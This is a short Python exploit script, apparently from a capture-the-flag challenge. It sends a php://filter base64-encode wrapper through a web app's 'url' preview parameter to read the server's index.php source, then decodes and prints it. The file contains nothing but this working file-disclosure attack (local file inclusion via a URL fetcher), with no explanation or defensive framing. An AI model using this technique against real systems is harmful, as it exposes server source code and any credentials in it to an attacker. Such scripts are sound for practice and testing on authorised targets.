import urllib.request
import urllib.parse
import re
import base64

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def fetch(target_url):
    url = BASE + '?url=' + urllib.parse.quote(target_url)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        res = urllib.request.urlopen(req)
        html = res.read().decode()
        m = re.search(r'class="preview-content">(.*?)</div>', html, re.DOTALL)
        if m:
            return m.group(1).strip()
        m = re.search(r'class="error-msg">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'ERROR: ' + m.group(1).strip()
        return 'OTHER'
    except Exception as e:
        return f'EXCEPTION: {e}'

# Use PHP filter to get base64-encoded source
result = fetch('php://filter/read=convert.base64-encode/resource=/var/www/html/index.php')
print('=== PHP Filter result ===')
if result.startswith('ERROR') or result.startswith('EXCEPTION'):
    print(result)
else:
    try:
        decoded = base64.b64decode(result).decode()
        print(decoded)
    except:
        print('Raw:', result[:2000])
